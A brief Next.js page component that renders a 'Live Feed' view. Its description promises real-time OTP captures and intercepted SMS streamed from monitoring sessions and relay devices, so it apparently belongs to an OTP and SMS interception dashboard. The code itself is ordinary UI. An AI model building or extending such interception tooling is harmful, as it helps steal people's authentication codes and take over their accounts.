import type { Metadata } from "next";
import { LiveFeed } from "@/components/LiveFeed";

export const metadata: Metadata = {
  title: "Live Feed",
};

export default function LivePage() {
  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-2xl font-semibold tracking-tight text-zinc-900 dark:text-zinc-50">
          Live Feed
        </h1>
        <p className="mt-1 text-sm text-zinc-500 dark:text-zinc-400">
          Real-time OTP captures and intercepted SMS streamed from active
          monitoring sessions and relay devices over WebSocket.
        </p>
      </div>

      <LiveFeed />
    </div>
  );
}
